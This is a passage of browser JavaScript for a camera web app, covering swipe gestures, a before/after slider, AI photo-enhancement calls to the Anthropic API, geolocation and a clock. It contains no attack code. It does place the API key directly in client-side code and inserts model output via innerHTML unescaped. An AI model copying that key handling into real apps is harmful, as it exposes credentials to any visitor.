  if(pvCaptionLayer) pvCaptionLayer.innerHTML='';
  showToast('Discarded');
}

// ════════════════════════════════════════════════════
//  SNAPCHAT-STYLE SWIPE-TO-DISCARD
// ════════════════════════════════════════════════════
function initSwipeDiscard(){
  const media=cacheElement('pvMedia');
  let startY=0, startX=0, dragging=false, curY=0;
  const THRESHOLD=110;
  function onStart(e){
    if(e.target.closest('#pvCaptionLayer,#baWrap,#aiChip,#pvSwipeHint,#pvDeleteZone')) return;
    const p=e.touches?e.touches[0]:e;
    startY=p.clientY; startX=p.clientX; dragging=true; curY=0;
  }
  function onMove(e){
    if(!dragging) return;
    const p=e.touches?e.touches[0]:e;
    const dy=p.clientY-startY;
    const dx=Math.abs(p.clientX-startX);
    if(dy<0||dx>dy) return;
    curY=dy;
    const preview = cacheElement('preview');
    if(preview) {
      preview.style.transform=`translateY(${curY}px)`;
      preview.style.opacity=Math.max(0.3, 1-curY/240);
    }
    const pvDeleteZone = cacheElement('pvDeleteZone');
    if(pvDeleteZone) pvDeleteZone.classList.toggle('show', curY>THRESHOLD*0.6);
    e.preventDefault();
  }
  function onEnd(){
    if(!dragging) return;
    dragging=false;
    const pvDeleteZone = cacheElement('pvDeleteZone');
    if(pvDeleteZone) pvDeleteZone.classList.remove('show');
    if(curY>=THRESHOLD){
      const preview = cacheElement('preview');
      if(preview) {
        preview.style.transition='transform .22s ease,opacity .22s ease';
        preview.style.transform='translateY(100vh)';
        preview.style.opacity='0';
      }
      setTimeout(()=>{
        const preview = cacheElement('preview');
        if(preview) {
          preview.style.transition='';
          preview.style.transform='';
          preview.style.opacity='';
        }
        discardPreview();
        resumeLureCamera();
      },230);
    } else {
      const preview = cacheElement('preview');
      if(preview) {
        preview.style.transition='transform .25s cubic-bezier(.4,0,.2,1),opacity .25s';
        preview.style.transform='';
        preview.style.opacity='';
      }
      setTimeout(()=>{
        const preview = cacheElement('preview');
        if(preview) preview.style.transition='';
      },260);
    }
    curY=0;
  }
  if(media) {
    media.addEventListener('touchstart',onStart,{passive:true});
    media.addEventListener('touchmove',onMove,{passive:false});
    media.addEventListener('touchend',onEnd);
    media.addEventListener('mousedown',onStart);
  }
  window.addEventListener('mousemove',onMove);
  window.addEventListener('mouseup',onEnd);
}

// ════════════════════════════════════════════════════
//  BEFORE / AFTER
// ════════════════════════════════════════════════════
function initBeforeAfter(){
  let drag=false;
  const wrap=cacheElement('baWrap'), split=cacheElement('baSplit'), handle=cacheElement('baHandle'), imgA=cacheElement('baImgA');
  if(!wrap || !split || !handle || !imgA) return;
  function setPos(x){ const r=wrap.getBoundingClientRect(); const pct=Math.max(5,Math.min(95,(x-r.left)/r.width*100)); split.style.left=pct+'%'; imgA.style.clipPath=`inset(0 ${100-pct}% 0 0)`; }
  split.addEventListener('mousedown',e=>{drag=true;e.preventDefault();});
  handle.addEventListener('mousedown',e=>{drag=true;e.preventDefault();});
  split.addEventListener('touchstart',e=>{drag=true;e.preventDefault();},{passive:false});
  handle.addEventListener('touchstart',e=>{drag=true;e.preventDefault();},{passive:false});
  window.addEventListener('mousemove',e=>{if(drag)setPos(e.clientX);});
  window.addEventListener('touchmove',e=>{if(drag&&e.touches[0])setPos(e.touches[0].clientX);},{passive:false});
  window.addEventListener('mouseup',()=>drag=false);
  window.addEventListener('touchend',()=>drag=false);
  const obs=new MutationObserver(()=>{ if(wrap.classList.contains('on')){ imgA.src=S._origUrl||S.capturedUrl; split.style.left='50%'; imgA.style.clipPath='inset(0 50% 0 0)'; } });
  obs.observe(wrap,{attributes:true,attributeFilter:['class']});
}

// ════════════════════════════════════════════════════
//  AI ENHANCE (unchanged)
// ════════════════════════════════════════════════════
async function runAI(){
  if(S.capturedType==='video') return showToast('AI works on photos only');
  const API_KEY = ''; // ← PASTE YOUR ANTHROPIC API KEY HERE
  if(!API_KEY){ showToast('Add your API key to enable AI'); return; }
  const aiModal = cacheElement('aiModal');
  const aiLoadingState = cacheElement('aiLoadingState');
  const aiResultBox = cacheElement('aiResultBox');
  const aiProgFill = cacheElement('aiProgFill');
  if(aiModal) aiModal.classList.add('on');
  if(aiLoadingState) aiLoadingState.style.display='block';
  if(aiResultBox) aiResultBox.classList.remove('on');
  if(aiProgFill) { aiProgFill.style.animation='none'; void aiProgFill.offsetWidth; aiProgFill.style.animation=''; }
  const statuses=['Analysing composition…','Detecting scene type…','Evaluating exposure…','Computing enhancements…','Preparing results…'];
  let si=0; const tick=setInterval(()=>{ 
    const aiStatusTxt = cacheElement('aiStatusTxt');
    if(aiStatusTxt) aiStatusTxt.textContent=statuses[si=(si+1)%statuses.length]; 
  },750);
  try{
    const img=new Image(); img.src=S.capturedUrl;
    await new Promise(r=>img.onload=r);
    const c=document.createElement('canvas'); c.width=320; c.height=Math.round(320*img.height/img.width);
    c.getContext('2d').drawImage(img,0,0,c.width,c.height);
    const b64 = c.toDataURL('image/jpeg', .75).split(',')[1];
    const resp = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': API_KEY,
        'anthropic-version': '2023-06-01'
      },
      body: JSON.stringify({
        model: 'claude-sonnet-4-20250514',
        max_tokens: 1000,
        messages: [{
          role: 'user',
          content: [
            { type: 'image', source: { type: 'base64', media_type: 'image/jpeg', data: b64 } },
            { type: 'text', text: `You are a professional photo editing AI. Analyse this photo and respond ONLY with valid JSON (no markdown, no extra text):
{"scene":"brief scene description (max 6 words)","mood":"single word mood","issues":["issue1","issue2"],"suggestions":{"brightness":<0-200>,"contrast":<0-200>,"saturation":<0-300>,"hue":<0-360>,"vignette":<0-100>,"warmth":<-50 to 50>,"fade":<0-100>,"filter":"one of: none|vivid|vintage|bw|warm|cool|neon|hdr|fade|film|cyber|golden|mist|punch|dusk|arctic|rose|teal"},"reasoning":"2 concise sentences explaining your choices"}` }
          ]
        }]
      })
    });
    clearInterval(tick);
    const data=await resp.json();
    const txt=data.content?.find(b=>b.type==='text')?.text||'{}';
    let parsed; try{parsed=JSON.parse(txt.replace(/```json|```/g,'').trim());}catch{parsed=null;}
    if(parsed){ S.aiData=parsed; showAIResult(parsed); }
    else{ showToast('AI analysis failed'); if(aiModal) aiModal.classList.remove('on'); }
  }catch(e){
    clearInterval(tick);
    const aiStatusTxt = cacheElement('aiStatusTxt');
    if(aiStatusTxt) aiStatusTxt.textContent='Could not connect to AI';
    showToast('AI unavailable');
    setTimeout(()=>{ if(aiModal) aiModal.classList.remove('on'); },2000);
  }
}

function showAIResult(d){
  const aiLoadingState = cacheElement('aiLoadingState');
  const aiSceneChip = cacheElement('aiSceneChip');
  const aiSettingsGrid = cacheElement('aiSettingsGrid');
  const aiResultBox = cacheElement('aiResultBox');
  const aiReasoningTxt = cacheElement('aiReasoningTxt');
  
  if(aiLoadingState) aiLoadingState.style.display='none';
  if(aiSceneChip) aiSceneChip.textContent='📷 '+d.scene;
  if(aiSettingsGrid) {
    aiSettingsGrid.innerHTML='';
    const s=d.suggestions||{};
    const fields=[['Filter',s.filter||'none'],['Brightness',s.brightness??100],['Contrast',s.contrast??100],['Saturation',s.saturation??100],['Vignette',s.vignette??0],['Warmth',s.warmth??0]];
    fields.forEach(([k,v])=>{ const el=document.createElement('div'); el.className='ai-setting'; el.innerHTML=`<div class="ai-s-key">${k}</div><div class="ai-s-val">${v}</div>`; aiSettingsGrid.appendChild(el); });
  }
  if(aiReasoningTxt) aiReasoningTxt.textContent=d.reasoning||'';
  if(aiResultBox) aiResultBox.classList.add('on');
}

const aiCancel = cacheElement('aiCancel');
if(aiCancel) aiCancel.addEventListener('click',()=>{
  const aiModal = cacheElement('aiModal');
  if(aiModal) aiModal.classList.remove('on');
});

const aiApply = cacheElement('aiApply');
if(aiApply) aiApply.addEventListener('click',()=>{
  if(!S.aiData?.suggestions) return;
  const s=S.aiData.suggestions;
  const map=[['brightness','b','slB','vB'],['contrast','c','slC','vC'],['saturation','s','slS','vS'],['hue','h','slH','vH'],['vignette','v','slV','vV'],['warmth','w','slW','vW'],['fade','f','slF','vF']];
  map.forEach(([sk,ak,sid,vid])=>{ if(s[sk]!=null){ S.adj[ak]=s[sk]; 
    const slElem = cacheElement(sid);
    const vElem = cacheElement(vid);
    if(slElem) slElem.value=s[sk];
    if(vElem) vElem.textContent=s[sk];
  } });
  if(s.filter){ S.filter=s.filter; document.querySelectorAll('.fc-chip').forEach(c=>c.classList.toggle('on',c.dataset.id===s.filter)); }
  if(S.capturedUrl&&S.capturedType==='photo'){
    const img=new Image(); img.onload=()=>{
      const c=document.createElement('canvas'); c.width=img.width; c.height=img.height;
      const ctx=c.getContext('2d'); ctx.filter=getCSS(); ctx.drawImage(img,0,0); ctx.filter='none';
      if(S.adj.v>0){const al=S.adj.v/100*.85;const g=ctx.createRadialGradient(c.width/2,c.height/2,c.width*.25,c.width/2,c.height/2,c.width*.8);g.addColorStop(0,'transparent');g.addColorStop(1,`rgba(0,0,0,${al})`);ctx.fillStyle=g;ctx.fillRect(0,0,c.width,c.height);}
      S.capturedUrl=c.toDataURL('image/jpeg',.93); 
      const pvImg = cacheElement('pvImg');
      if(pvImg) pvImg.src=S.capturedUrl;
    }; img.src=S._origUrl||S.capturedUrl;
  }
  const aiModal = cacheElement('aiModal');
  const aiChip = cacheElement('aiChip');
  if(aiModal) aiModal.classList.remove('on');
  if(aiChip) aiChip.classList.add('on');
  showToast('✦ AI settings applied!');
});

// ════════════════════════════════════════════════════
//  LOCATION
// ════════════════════════════════════════════════════
function handlePosition(pos){
  const{latitude:lat,longitude:lng}=pos.coords;
  S.loc={lat,lng,city:'Locating…'};
  const locCoords = cacheElement('locCoords');
  if(locCoords) locCoords.textContent=`${lat.toFixed(4)}°, ${lng.toFixed(4)}°`;
  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
    .then(r=>r.json())
    .then(d=>{
      const city=d.address?.city||d.address?.town||d.address?.village||d.address?.county||'Unknown';
      const cc=(d.address?.country_code||'').toUpperCase();
      S.loc.city=`${city}, ${cc}`;
      const locCity = cacheElement('locCity');
      if(locCity) locCity.textContent=S.loc.city;
    })
    .catch(()=>{ S.loc.city=`${lat.toFixed(3)}°N`; 
      const locCity = cacheElement('locCity');
      if(locCity) locCity.textContent=S.loc.city; 
    });
}

// ════════════════════════════════════════════════════
//  CLOCK
// ════════════════════════════════════════════════════
function startClock(){
  function tick(){
    const n=new Date();
    const timeDis = cacheElement('timeDis');
    const dateDis = cacheElement('dateDis');
    const isoChip = cacheElement('isoChip');
    const exposureChip = cacheElement('exposureChip');
    if(timeDis) timeDis.textContent=n.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false});
    if(dateDis) dateDis.textContent=n.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
    const h=n.getHours();
    const iso = h<6||h>20?'ISO 3200':(h<8||h>18?'ISO 800':'ISO 100');
    const exp = h<6||h>20?'1/15s':(h<8||h>18?'1/30s':'1/120s');
    if(isoChip) isoChip.textContent=iso;
    if(exposureChip) exposureChip.textContent=exp;
  }
  tick(); setInterval(tick,1000);
}

// ════════════════════════════════════════════════════
//  ORIENTATION / LEVEL
// ════════════════════════════════════════════════════
function initOrient(){
  if(window.DeviceOrientationEvent){
    window.addEventListener('deviceorientation',e=>{
      if(!S.showHorizon) return;
      const beta=e.beta||0;
      const gamma=e.gamma||0;
      const isLevel=Math.abs(beta)<3&&Math.abs(gamma)<3;
      const hzDot = cacheElement('hzDot');
      if(hzDot) {
        hzDot.classList.toggle('level',isLevel);
        const x=50+Math.max(-45,Math.min(45,gamma));
        const y=50+Math.max(-45,Math.min(45,beta-90));
        hzDot.style.left=x+'%'; 
        hzDot.style.top=y+'%';
      }
    });
  }
}

// ════════════════════════════════════════════════════
//  UTILS
// ════════════════════════════════════════════════════
function showZoom(txt){ 
  const r=cacheElement('zoomRing'); 
  if(!r) return;
  r.textContent=txt; 
  r.classList.add('show'); 
  clearTimeout(r._t); 
  r._t=setTimeout(()=>r.classList.remove('show'),900); 
}
function hyp(t){ return Math.hypot(t[0].clientX-t[1].clientX,t[0].clientY-t[1].clientY); }

let _tt;
function showToast(msg){ 
  const t=cacheElement('toast'); 
  if(!t) return;
  t.textContent=msg; 
  t.classList.add('on'); 
  clearTimeout(_tt); 
  _tt=setTimeout(()=>t.classList.remove('on'),2200); 
}
